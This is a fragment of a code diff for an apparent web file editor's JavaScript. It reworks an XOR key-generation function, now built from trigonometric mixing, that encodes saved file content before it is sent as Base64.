       oldNameInput.value = '';
       newNameInput.value = '';
@@ -919,12 +1333,20 @@ if (renameForm) {
   });
 }
 
-/* ===== Editor XOR (save only) — send Base64 (existing editor protocol) ===== */
 function editorKey(i){
-  const h = ((i*31 + 7) >>> 0).toString(16);
-  const last2 = h.slice(-2);
-  const hx = parseInt(last2 || '0', 16);
-  const k = ((hx ^ (i & 0xFF)) + Math.floor(Math.log10(i + 3) * 97)) & 0xFF;
+  const val = (i * 31 + 7) >>> 0;
+  const bx  = val & 0xFF;
+
+  const HALF_PI = Math.PI / 2;
+
+  const a = Math.asin(Math.sin(i + 3)) / HALF_PI;
+  const c = Math.cos(i * 0.5);
+  const t = Math.atan(Math.tan((i + 1) * 0.25)) / HALF_PI;
+
+  const mix = (a + c + t) / 3.0;
+  const trigByte = Math.floor((mix + 1.0) * 127.5);
+
+  const k = ((bx ^ (i & 0xFF)) + trigByte) & 0xFF;
   return k;
 }
 function editorEncodeToBinaryString(str){
